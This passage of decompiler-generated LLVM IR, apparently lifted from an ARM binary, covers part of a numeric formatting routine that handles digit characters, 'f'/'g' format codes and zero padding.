  %v3_f5a0 = load i8, i8* %v2_f5a0, align 1
  %v4_f5a0 = zext i8 %v3_f5a0 to i32
  store i32 %v1_f5a0, i32* %r1.global-to-local, align 4
  %v2_f5a4 = add i32 %v4_f5a0, %v1_f5a4
  store i32 %v2_f5a4, i32* %r3.global-to-local, align 4
  %v1_f5a8 = trunc i32 %v2_f5a4 to i8
  store i8 %v1_f5a8, i8* %v2_f5a0, align 1
  %v0_f5ac = load i32, i32* %r1.global-to-local, align 4
  %v1_f5ac = inttoptr i32 %v0_f5ac to i8*
  %v2_f5ac = load i8, i8* %v1_f5ac, align 1
  %v3_f5ac = zext i8 %v2_f5ac to i32
  store i32 %v3_f5ac, i32* %r2.global-to-local, align 4
  %v2_f5b0 = icmp ugt i8 %v2_f5ac, 56
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_f5b0 = icmp ult i8 %v2_f5ac, 57
  store i1 %v6_f5b0, i1* %cpsr_n.global-to-local, align 1
  %v7_f5b0 = icmp eq i8 %v2_f5ac, 57
  store i1 %v7_f5b0, i1* %cpsr_z.global-to-local, align 1
  %v2_f5b4 = xor i1 %v2_f5b0, true
  %v3_f5b4 = or i1 %v7_f5b0, %v2_f5b4
  br i1 %v3_f5b4, label %bb199, label %bb200

bb199:                                            ; preds = %.preheader
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb200

bb200:                                            ; preds = %.preheader, %bb199
  %v2_f5b8 = xor i1 %v7_f5b0, true
  %v3_f5b8 = and i1 %v2_f5b0, %v2_f5b8
  br i1 %v3_f5b8, label %bb201, label %._crit_edge

._crit_edge:                                      ; preds = %bb200
  %v1_f5c0.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb202

bb201:                                            ; preds = %bb200
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb202

bb202:                                            ; preds = %._crit_edge, %bb201
  %v1_f5c0 = phi i32 [ %v1_f5c0.pre, %._crit_edge ], [ 1, %bb201 ]
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_f5bc = icmp ult i8 %v2_f5ac, 48
  store i1 %v6_f5bc, i1* %cpsr_n.global-to-local, align 1
  %v7_f5bc = icmp eq i8 %v2_f5ac, 48
  store i1 %v7_f5bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f5bc, label %.thread20, label %bb203

.thread20:                                        ; preds = %bb202
  %v2_f5c0 = or i32 %v1_f5c0, 1
  store i32 %v2_f5c0, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_f5c421 = icmp slt i32 %v2_f5c0, 0
  store i1 %v1_f5c421, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %.backedge

bb203:                                            ; preds = %bb202
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_f5c4 = icmp slt i32 %v1_f5c0, 0
  store i1 %v1_f5c4, i1* %cpsr_n.global-to-local, align 1
  %v2_f5c4 = icmp eq i32 %v1_f5c0, 0
  store i1 %v2_f5c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f5c4, label %dec_label_pc_f5cc, label %.backedge

.backedge:                                        ; preds = %bb203, %.thread20
  %v1_f5a4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.preheader

dec_label_pc_f5cc:                                ; preds = %bb203
  store i32 %v2_f570, i32* %r2.global-to-local, align 4
  %v2_f5d0 = ptrtoint i32* %stack_var_-86 to i32
  store i32 %v2_f5d0, i32* %r3.global-to-local, align 4
  %v2_f5d4 = sub i32 %v0_f5ac, %v2_f5d0
  %v3_f5d4 = icmp uge i32 %v0_f5ac, %v2_f5d0
  %v4_f5d4 = xor i32 %v0_f5ac, %v2_f5d0
  %v5_f5d4 = xor i32 %v2_f5d4, %v0_f5ac
  %v6_f5d4 = and i32 %v5_f5d4, %v4_f5d4
  %v7_f5d4 = icmp slt i32 %v6_f5d4, 0
  store i1 %v7_f5d4, i1* %cpsr_v.global-to-local, align 1
  %v8_f5d4 = icmp slt i32 %v2_f5d4, 0
  store i1 %v8_f5d4, i1* %cpsr_n.global-to-local, align 1
  %v9_f5d4 = icmp eq i32 %v0_f5ac, %v2_f5d0
  store i1 %v9_f5d4, i1* %cpsr_z.global-to-local, align 1
  %v2_f5d8 = xor i1 %v3_f5d4, true
  %v3_f5d8 = or i1 %v9_f5d4, %v2_f5d8
  br i1 %v3_f5d8, label %bb204, label %.thread124

bb204:                                            ; preds = %dec_label_pc_f5cc
  store i32 %v2_f5d0, i32* %r2.global-to-local, align 4
  store i32 %v2_f5d0, i32* %r1.global-to-local, align 4
  br label %.thread124

.thread124:                                       ; preds = %dec_label_pc_f5cc, %bb204
  %v2_f5f4 = phi i32 [ %v2_f5d0, %bb204 ], [ %v0_f5ac, %dec_label_pc_f5cc ]
  %v4_f5e4123 = phi i32 [ %v2_f5d0, %bb204 ], [ %v2_f570, %dec_label_pc_f5cc ]
  %v2_f5e0 = xor i1 %v9_f5d4, true
  %v3_f5e0 = and i1 %v3_f5d4, %v2_f5e0
  br i1 %v3_f5e0, label %bb205, label %.thread125

bb205:                                            ; preds = %.thread124
  %v4_f5e0 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v4_f5e0, i32* %r0.global-to-local, align 4
  %v5_f5e4 = add i32 %v4_f5e4123, 2
  store i32 %v5_f5e4, i32* %r2.global-to-local, align 4
  br label %.thread125

.thread125:                                       ; preds = %.thread124, %bb205
  br i1 %v3_f5d8, label %bb206, label %bb207

bb206:                                            ; preds = %.thread125
  %v4_f5e8 = load i32, i32* %sb.global-to-local, align 4
  %v5_f5e8 = add i32 %v4_f5e8, 1
  store i32 %v5_f5e8, i32* %r0.global-to-local, align 4
  br label %bb207

bb207:                                            ; preds = %.thread125, %bb206
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_f5f0 = load i32, i32* %r7.global-to-local, align 4
  %v1_f5f0 = add i32 %v0_f5f0, -103
  %v3_f5f0 = sub i32 102, %v0_f5f0
  %v4_f5f0 = and i32 %v3_f5f0, %v0_f5f0
  %v5_f5f0 = icmp slt i32 %v4_f5f0, 0
  store i1 %v5_f5f0, i1* %cpsr_v.global-to-local, align 1
  %v6_f5f0 = icmp slt i32 %v1_f5f0, 0
  store i1 %v6_f5f0, i1* %cpsr_n.global-to-local, align 1
  %v7_f5f0 = icmp eq i32 %v0_f5f0, 103
  store i1 %v7_f5f0, i1* %cpsr_z.global-to-local, align 1
  %v3_f5f4 = add i32 %v2_f5f4, 1
  %v4_f5f4 = inttoptr i32 %v3_f5f4 to i8*
  store i8 0, i8* %v4_f5f4, align 1
  %v0_f5f8 = load i32, i32* %r1.global-to-local, align 4
  %v1_f5f8 = add i32 %v0_f5f8, 1
  store i32 %v1_f5f8, i32* %r1.global-to-local, align 4
  %v0_f5fc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f5fc, label %bb208, label %dec_label_pc_f62c

bb208:                                            ; preds = %bb207
  %v0_f600 = load i32, i32* %r0.global-to-local, align 4
  %v1_f600 = load i32, i32* %ip.global-to-local, align 4
  %not.v7_f604 = icmp sge i32 %v1_f600, %v0_f600
  %. = zext i1 %not.v7_f604 to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %v2_f60c = add i32 %v0_f600, 4
  %v4_f60c = sub i32 0, %v0_f600
  %v5_f60c = and i32 %v2_f60c, %v4_f60c
  %v6_f60c = icmp slt i32 %v5_f60c, 0
  store i1 %v6_f60c, i1* %cpsr_v.global-to-local, align 1
  %v7_f60c = icmp slt i32 %v2_f60c, 0
  store i1 %v7_f60c, i1* %cpsr_n.global-to-local, align 1
  %v8_f60c = icmp eq i32 %v2_f60c, 0
  store i1 %v8_f60c, i1* %cpsr_z.global-to-local, align 1
  %v5_f610 = icmp slt i32 %v0_f600, -4
  br i1 %v5_f610, label %.thread24, label %bb209

.thread24:                                        ; preds = %bb208
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %.thread

bb209:                                            ; preds = %bb208
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_f614 = icmp eq i1 %not.v7_f604, false
  store i1 %v2_f614, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f614, label %.thread, label %bb210

.thread:                                          ; preds = %.thread24, %bb209
  %v1_f61829 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_f61829, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_f638

bb210:                                            ; preds = %bb209
  %v3_f61c = sub i32 %v1_f600, %v0_f600
  store i32 %v3_f61c, i32* %r8.global-to-local, align 4
  store i32 102, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_f644

dec_label_pc_f62c:                                ; preds = %bb207
  %v0_f62c = load i32, i32* %r7.global-to-local, align 4
  %v1_f62c = add i32 %v0_f62c, -102
  %v3_f62c = sub i32 101, %v0_f62c
  %v4_f62c = and i32 %v3_f62c, %v0_f62c
  %v5_f62c = icmp slt i32 %v4_f62c, 0
  store i1 %v5_f62c, i1* %cpsr_v.global-to-local, align 1
  %v6_f62c = icmp slt i32 %v1_f62c, 0
  store i1 %v6_f62c, i1* %cpsr_n.global-to-local, align 1
  %v7_f62c = icmp eq i32 %v0_f62c, 102
  store i1 %v7_f62c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_f62c, i32* %sl.global-to-local, align 4
  br i1 %v7_f62c, label %dec_label_pc_f62c.dec_label_pc_f644_crit_edge, label %dec_label_pc_f638

dec_label_pc_f62c.dec_label_pc_f644_crit_edge:    ; preds = %dec_label_pc_f62c
  %v0_f644.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f644

dec_label_pc_f638:                                ; preds = %.thread, %dec_label_pc_f62c
  store i32 0, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f654

dec_label_pc_f644:                                ; preds = %bb210, %dec_label_pc_f62c.dec_label_pc_f644_crit_edge
  %v0_f644 = phi i32 [ %v0_f644.pre, %dec_label_pc_f62c.dec_label_pc_f644_crit_edge ], [ %v0_f600, %bb210 ]
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_f644 = icmp slt i32 %v0_f644, 0
  store i1 %v1_f644, i1* %cpsr_n.global-to-local, align 1
  %v2_f644 = icmp eq i32 %v0_f644, 0
  store i1 %v2_f644, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_f644, label %bb211, label %bb212

bb211:                                            ; preds = %dec_label_pc_f644
  store i32 48, i32* %r3.global-to-local, align 4
  %v5_f64c = load i32, i32* %r2.global-to-local, align 4
  %v6_f64c = add i32 %v5_f64c, -1
  %v7_f64c = inttoptr i32 %v6_f64c to i8*
  store i8 48, i8* %v7_f64c, align 1
  %v8_f64c = load i32, i32* %r2.global-to-local, align 4
  %v9_f64c = add i32 %v8_f64c, -1
  store i32 %v9_f64c, i32* %r2.global-to-local, align 4
  %v0_f650.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_f680.pre.pre = load i32, i32* %r1.global-to-local, align 4
  %v0_f684.pre.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_f684.pre.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %bb212

bb212:                                            ; preds = %dec_label_pc_f644, %bb211
  %v1_f684.pre = phi i1 [ %v1_f684.pre.pre, %bb211 ], [ false, %dec_label_pc_f644 ]
  %v0_f684.pre = phi i1 [ %v0_f684.pre.pre, %bb211 ], [ false, %dec_label_pc_f644 ]
  %v1_f680.pre = phi i32 [ %v1_f680.pre.pre, %bb211 ], [ %v1_f5f8, %dec_label_pc_f644 ]
  %v0_f650 = phi i32 [ %v0_f650.pre, %bb211 ], [ %v0_f644, %dec_label_pc_f644 ]
  store i32 %v0_f650, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_f654

dec_label_pc_f654:                                ; preds = %dec_label_pc_f638, %bb212
  %v0_f724 = phi i32 [ 0, %dec_label_pc_f638 ], [ %v0_f650, %bb212 ]
  %v1_f688 = phi i1 [ false, %dec_label_pc_f638 ], [ %v1_f684.pre, %bb212 ]
  %v0_f688 = phi i1 [ false, %dec_label_pc_f638 ], [ %v0_f684.pre, %bb212 ]
  %v1_f680 = phi i32 [ %v1_f5f8, %dec_label_pc_f638 ], [ %v1_f680.pre, %bb212 ]
  store i32 1, i32* %stack_var_-168, align 4
  store i32 176, i32* %r5.global-to-local, align 4
  %v2_f660 = ptrtoint i32* %stack_var_-46 to i32
  store i32 %v2_f660, i32* %r3.global-to-local, align 4
  %v0_f66c = load i32, i32* %r2.global-to-local, align 4
  %v1_f66c = inttoptr i32 %v0_f66c to i8*
  %v2_f66c = load i8, i8* %v1_f66c, align 1
  %v3_f66c = zext i8 %v2_f66c to i32
  store i32 %v3_f66c, i32* %r3.global-to-local, align 4
  %v5_f66c = add i32 %v0_f66c, 1
  store i32 %v5_f66c, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %v3_f66c, i32* %stack_var_-46, align 4
  %v2_f680 = sub i32 %v1_f680, %v5_f66c
  store i32 %v2_f680, i32* %r1.global-to-local, align 4
  %v2_f684 = xor i1 %v1_f688, %v0_f688
  br i1 %v2_f684, label %.thread127, label %dec_label_pc_f68c

.thread127:                                       ; preds = %dec_label_pc_f654
  %v5_f684 = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v5_f684, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_f734

dec_label_pc_f68c:                                ; preds = %dec_label_pc_f654
  store i32 112, i32* %r3.global-to-local, align 4
  %v2_f690 = sub i32 %v0_f724, %v2_f680
  %v4_f690 = xor i32 %v2_f680, %v0_f724
  %v5_f690 = xor i32 %v2_f690, %v0_f724
  %v6_f690 = and i32 %v5_f690, %v4_f690
  %v7_f690 = icmp slt i32 %v6_f690, 0
  store i1 %v7_f690, i1* %cpsr_v.global-to-local, align 1
  %v8_f690 = icmp slt i32 %v2_f690, 0
  store i1 %v8_f690, i1* %cpsr_n.global-to-local, align 1
  %v9_f690 = icmp eq i32 %v0_f724, %v2_f680
  store i1 %v9_f690, i1* %cpsr_z.global-to-local, align 1
  store i32 112, i32* %stack_var_-160, align 4
  %v2_f69c = xor i1 %v8_f690, %v7_f690
  br i1 %v2_f69c, label %bb214, label %dec_label_pc_f6a0

dec_label_pc_f6a0:                                ; preds = %dec_label_pc_f68c
  store i32 %v2_f690, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 %v8_f690, i1* %cpsr_n.global-to-local, align 1
  %v2_f6a4 = icmp eq i32 %v2_f690, 0
  store i1 %v2_f6a4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_f304, i32* %lr.global-to-local, align 4
  %tmp213 = icmp slt i32 %v2_f690, 1
  br i1 %tmp213, label %.thread129, label %dec_label_pc_f6b8

.thread129:                                       ; preds = %dec_label_pc_f6a0
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_f730

dec_label_pc_f6b8:                                ; preds = %dec_label_pc_f6a0
  store i32 ptrtoint (i32* @global_var_1496f.668 to i32), i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_f6c4 = ptrtoint i32* %stack_var_-136 to i32
  store i32 %v2_f6c4, i32* %r6.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  store i32 176, i32* %stack_var_-148, align 4
  br label %dec_label_pc_f734

bb214:                                            ; preds = %dec_label_pc_f68c
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_f710 = icmp slt i32 %v0_f724, 0
  store i1 %v1_f710, i1* %cpsr_n.global-to-local, align 1
  %v2_f710 = icmp eq i32 %v0_f724, 0
  store i1 %v2_f710, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_f304, i32* %lr.global-to-local, align 4
  %tmp215 = icmp slt i32 %v0_f724, 1
  br i1 %tmp215, label %dec_label_pc_f730, label %dec_label_pc_f720

dec_label_pc_f720:                                ; preds = %bb214
  %v2_f724 = sub i32 %v2_f680, %v0_f724
  store i32 %v2_f724, i32* %r1.global-to-local, align 4
  %v2_f728 = add i32 %v5_f66c, %v0_f724
  store i32 %v2_f728, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f730

dec_label_pc_f730:                                ; preds = %dec_label_pc_f720, %.thread129, %bb214
  %storemerge141.in = phi i32* [ %stack_var_-160, %bb214 ], [ %stack_var_-148, %.thread129 ], [ %stack_var_-148, %dec_label_pc_f720 ]
  %v0_f74482 = phi i32 [ %v2_f680, %bb214 ], [ 0, %.thread129 ], [ %v2_f724, %dec_label_pc_f720 ]
  %storemerge141 = ptrtoint i32* %storemerge141.in to i32
  store i32 %storemerge141, i32* %r6.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_f734

dec_label_pc_f734:                                ; preds = %.thread127, %dec_label_pc_f6b8, %dec_label_pc_f730
  %v1_f764 = phi i32 [ %v2_f6c4, %dec_label_pc_f6b8 ], [ %storemerge141, %dec_label_pc_f730 ], [ %v5_f684, %.thread127 ]
  %v0_f77c90 = phi i32 [ -1, %dec_label_pc_f6b8 ], [ -1, %dec_label_pc_f730 ], [ %v0_f724, %.thread127 ]
  %v0_f744 = phi i32 [ 0, %dec_label_pc_f6b8 ], [ %v0_f74482, %dec_label_pc_f730 ], [ %v2_f680, %.thread127 ]
  %v0_f734 = load i32, i32* %fp.global-to-local, align 4
  %v1_f734 = add i32 %v0_f734, 12
  %v2_f734 = inttoptr i32 %v1_f734 to i32*
  %v3_f734 = load i32, i32* %v2_f734, align 4
  %v1_f738 = and i32 %v3_f734, 16
  store i32 %v1_f738, i32* %lr.global-to-local, align 4
  %v2_f738 = icmp eq i32 %v1_f738, 0
  %tmp238 = zext i1 %v2_f738 to i32
  %.230 = xor i32 %tmp238, 1
  store i32 %.230, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_f744 = icmp slt i32 %v0_f744, 0
  store i1 %v1_f744, i1* %cpsr_n.global-to-local, align 1
  %v2_f744 = icmp eq i32 %v0_f744, 0
  store i1 %v2_f744, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f744, label %bb218, label %.thread33

.thread33:                                        ; preds = %dec_label_pc_f734
  store i32 1, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f760

bb218:                                            ; preds = %dec_label_pc_f734
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 %v2_f738, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f738, label %dec_label_pc_f754, label %dec_label_pc_f760

dec_label_pc_f754:                                ; preds = %bb218
  %v0_f754 = load i32, i32* %r7.global-to-local, align 4
  %v1_f754 = add i32 %v0_f754, -103
  %v3_f754 = sub i32 102, %v0_f754
  %v4_f754 = and i32 %v3_f754, %v0_f754
  %v5_f754 = icmp slt i32 %v4_f754, 0
  store i1 %v5_f754, i1* %cpsr_v.global-to-local, align 1
  %v6_f754 = icmp slt i32 %v1_f754, 0
  store i1 %v6_f754, i1* %cpsr_n.global-to-local, align 1
  %v7_f754 = icmp eq i32 %v0_f754, 103
  store i1 %v7_f754, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f754, label %dec_label_pc_f77c, label %bb219

bb219:                                            ; preds = %dec_label_pc_f754
  %v1_f758 = load i32, i32* %r8.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v2_f758 = icmp slt i32 %v1_f758, 0
  store i1 %v2_f758, i1* %cpsr_n.global-to-local, align 1
  %v3_f758 = icmp eq i32 %v1_f758, 0
  store i1 %v3_f758, i1* %cpsr_z.global-to-local, align 1
  %tmp220 = icmp slt i32 %v1_f758, 1
  br i1 %tmp220, label %dec_label_pc_f77c, label %dec_label_pc_f760

dec_label_pc_f760:                                ; preds = %.thread33, %bb218, %bb219
  %v2_f764 = inttoptr i32 %v1_f764 to i32*
  store i32 112, i32* %v2_f764, align 4
  %v1_f76c = load i32, i32* %r6.global-to-local, align 4
  %v2_f76c = add i32 %v1_f76c, 4
  %v3_f76c = inttoptr i32 %v2_f76c to i32*
  store i32 1, i32* %v3_f76c, align 4
  store i32 ptrtoint (i32* @global_var_1497c.670 to i32), i32* %r3.global-to-local, align 4
  %v1_f774 = load i32, i32* %r6.global-to-local, align 4
  %v2_f774 = add i32 %v1_f774, 8
  %v3_f774 = inttoptr i32 %v2_f774 to i32*
  store i32 ptrtoint (i32* @global_var_1497c.670 to i32), i32* %v3_f774, align 4
  %v0_f778 = load i32, i32* %r6.global-to-local, align 4
  %v1_f778 = add i32 %v0_f778, 12
  store i32 %v1_f778, i32* %r6.global-to-local, align 4
  %v0_f77c.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_f77c

dec_label_pc_f77c:                                ; preds = %dec_label_pc_f754, %bb219, %dec_label_pc_f760
  %v1_f788 = phi i32 [ %v1_f764, %bb219 ], [ %v1_f778, %dec_label_pc_f760 ], [ %v1_f764, %dec_label_pc_f754 ]
  %v0_f77c = phi i32 [ %v0_f77c90, %bb219 ], [ %v0_f77c.pre, %dec_label_pc_f760 ], [ %v0_f77c90, %dec_label_pc_f754 ]
  %v1_f77c = add i32 %v0_f77c, 1
  store i32 %v1_f77c, i32* %ip.global-to-local, align 4
  %v3_f77c = sub i32 0, %v0_f77c
  %v4_f77c = and i32 %v1_f77c, %v3_f77c
  %v5_f77c = icmp slt i32 %v4_f77c, 0
  store i1 %v5_f77c, i1* %cpsr_v.global-to-local, align 1
  %v6_f77c = icmp slt i32 %v1_f77c, 0
  store i1 %v6_f77c, i1* %cpsr_n.global-to-local, align 1
  %v7_f77c = icmp eq i32 %v1_f77c, 0
  store i1 %v7_f77c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f77c, label %dec_label_pc_f7a0, label %dec_label_pc_f784

dec_label_pc_f784:                                ; preds = %dec_label_pc_f77c
  %v1_f784 = sub i32 -1, %v0_f77c
  %v2_f788 = add i32 %v1_f788, 4
  %v3_f788 = inttoptr i32 %v2_f788 to i32*
  store i32 %v1_f784, i32* %v3_f788, align 4
  store i32 ptrtoint (i32* @global_var_1496f.668 to i32), i32* %r3.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v1_f794 = load i32, i32* %r6.global-to-local, align 4
  %v2_f794 = inttoptr i32 %v1_f794 to i32*
  store i32 176, i32* %v2_f794, align 4
  %v0_f798 = load i32, i32* %r3.global-to-local, align 4
  %v1_f798 = load i32, i32* %r6.global-to-local, align 4
  %v2_f798 = add i32 %v1_f798, 8
  %v3_f798 = inttoptr i32 %v2_f798 to i32*
  store i32 %v0_f798, i32* %v3_f798, align 4
  %v0_f79c = load i32, i32* %r6.global-to-local, align 4
  %v1_f79c = add i32 %v0_f79c, 12
  store i32 %v1_f79c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_f7a0

dec_label_pc_f7a0:                                ; preds = %dec_label_pc_f77c, %dec_label_pc_f784
  %v2_f7a8 = phi i32 [ %v1_f788, %dec_label_pc_f77c ], [ %v1_f79c, %dec_label_pc_f784 ]
  %v0_f7a0 = load i32, i32* %r1.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_f7a0 = icmp slt i32 %v0_f7a0, 0
  store i1 %v1_f7a0, i1* %cpsr_n.global-to-local, align 1
  %v2_f7a0 = icmp eq i32 %v0_f7a0, 0
  store i1 %v2_f7a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f7a0, label %.thread42, label %bb221

bb221:                                            ; preds = %dec_label_pc_f7a0
  store i32 112, i32* %r3.global-to-local, align 4
  %v3_f7a8 = inttoptr i32 %v2_f7a8 to i32*
  store i32 112, i32* %v3_f7a8, align 4
  %v1_f7ac = load i32, i32* %r4.global-to-local, align 4
  %v2_f7ac = load i32, i32* %r6.global-to-local, align 4
  %v3_f7ac = add i32 %v2_f7ac, 8
  %v4_f7ac = inttoptr i32 %v3_f7ac to i32*
  store i32 %v1_f7ac, i32* %v4_f7ac, align 4
  %v1_f7b0 = load i32, i32* %r1.global-to-local, align 4
  %v2_f7b0 = load i32, i32* %r6.global-to-local, align 4
  %v3_f7b0 = add i32 %v2_f7b0, 4
  %v4_f7b0 = inttoptr i32 %v3_f7b0 to i32*
  store i32 %v1_f7b0, i32* %v4_f7b0, align 4
  %v1_f7b4 = load i32, i32* %r6.global-to-local, align 4
  %v2_f7b4 = add i32 %v1_f7b4, 12
  store i32 %v2_f7b4, i32* %r6.global-to-local, align 4
  br label %.thread42

.thread42:                                        ; preds = %dec_label_pc_f7a0, %bb221
  %v1_f7d8 = phi i32 [ %v2_f7a8, %dec_label_pc_f7a0 ], [ %v2_f7b4, %bb221 ]
  %v0_f7b8 = load i32, i32* %r7.global-to-local, align 4
  %v1_f7b8 = add i32 %v0_f7b8, -103
  %v3_f7b8 = sub i32 102, %v0_f7b8
  %v4_f7b8 = and i32 %v3_f7b8, %v0_f7b8
  %v5_f7b8 = icmp slt i32 %v4_f7b8, 0
  store i1 %v5_f7b8, i1* %cpsr_v.global-to-local, align 1
  %v6_f7b8 = icmp slt i32 %v1_f7b8, 0
  store i1 %v6_f7b8, i1* %cpsr_n.global-to-local, align 1
  %v7_f7b8 = icmp eq i32 %v0_f7b8, 103
  store i1 %v7_f7b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f7b8, label %dec_label_pc_f7c0, label %dec_label_pc_f7c8

dec_label_pc_f7c0:                                ; preds = %.thread42
  %v0_f7c0 = load i32, i32* %lr.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_f7c0 = icmp slt i32 %v0_f7c0, 0
  store i1 %v1_f7c0, i1* %cpsr_n.global-to-local, align 1
  %v2_f7c0 = icmp eq i32 %v0_f7c0, 0
  store i1 %v2_f7c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f7c0, label %dec_label_pc_f7f0, label %dec_label_pc_f7c8

dec_label_pc_f7c8:                                ; preds = %.thread42, %dec_label_pc_f7c0
  %v0_f7c8 = load i32, i32* %ip.global-to-local, align 4
  %v1_f7c8 = load i32, i32* %r1.global-to-local, align 4
  %v2_f7c8 = sub i32 %v1_f7c8, %v0_f7c8
  store i32 %v2_f7c8, i32* %r3.global-to-local, align 4
  %v1_f7cc = load i32, i32* %r8.global-to-local, align 4
  %v2_f7cc = sub i32 %v2_f7c8, %v1_f7cc
  %v4_f7cc = xor i32 %v1_f7cc, %v2_f7c8
  %v5_f7cc = xor i32 %v2_f7cc, %v2_f7c8
  %v6_f7cc = and i32 %v5_f7cc, %v4_f7cc
  %v7_f7cc = icmp slt i32 %v6_f7cc, 0
  store i1 %v7_f7cc, i1* %cpsr_v.global-to-local, align 1
  %v8_f7cc = icmp slt i32 %v2_f7cc, 0
  store i1 %v8_f7cc, i1* %cpsr_n.global-to-local, align 1
  %v9_f7cc = icmp eq i32 %v2_f7c8, %v1_f7cc
  store i1 %v9_f7cc, i1* %cpsr_z.global-to-local, align 1
  %v2_f7d0 = xor i1 %v8_f7cc, %v7_f7cc
  br i1 %v2_f7d0, label %dec_label_pc_f7d4, label %dec_label_pc_f7f0

dec_label_pc_f7d4:                                ; preds = %dec_label_pc_f7c8
  %v2_f7d4 = sub i32 %v1_f7cc, %v2_f7c8
  %v2_f7d8 = add i32 %v1_f7d8, 4
  %v3_f7d8 = inttoptr i32 %v2_f7d8 to i32*
  store i32 %v2_f7d4, i32* %v3_f7d8, align 4
  store i32 ptrtoint (i32* @global_var_1496f.668 to i32), i32* %r3.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v1_f7e4 = load i32, i32* %r6.global-to-local, align 4
  %v2_f7e4 = inttoptr i32 %v1_f7e4 to i32*
  store i32 176, i32* %v2_f7e4, align 4
  %v0_f7e8 = load i32, i32* %r3.global-to-local, align 4
  %v1_f7e8 = load i32, i32* %r6.global-to-local, align 4
  %v2_f7e8 = add i32 %v1_f7e8, 8
  %v3_f7e8 = inttoptr i32 %v2_f7e8 to i32*
  store i32 %v0_f7e8, i32* %v3_f7e8, align 4
  %v0_f7ec = load i32, i32* %r6.global-to-local, align 4
  %v1_f7ec = add i32 %v0_f7ec, 12
  store i32 %v1_f7ec, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_f7f0

dec_label_pc_f7f0:                                ; preds = %dec_label_pc_f7c8, %dec_label_pc_f7c0, %dec_label_pc_f7d4
  %v1_f884.pre.pre = phi i32 [ %v1_f7d8, %dec_label_pc_f7c8 ], [ %v1_f7d8, %dec_label_pc_f7c0 ], [ %v1_f7ec, %dec_label_pc_f7d4 ]
  %v0_f7f0 = load i32, i32* %sl.global-to-local, align 4
  %v1_f7f0 = add i32 %v0_f7f0, -102
  %v3_f7f0 = sub i32 101, %v0_f7f0
  %v4_f7f0 = and i32 %v3_f7f0, %v0_f7f0
  %v5_f7f0 = icmp slt i32 %v4_f7f0, 0
  store i1 %v5_f7f0, i1* %cpsr_v.global-to-local, align 1
  %v6_f7f0 = icmp slt i32 %v1_f7f0, 0
  store i1 %v6_f7f0, i1* %cpsr_n.global-to-local, align 1
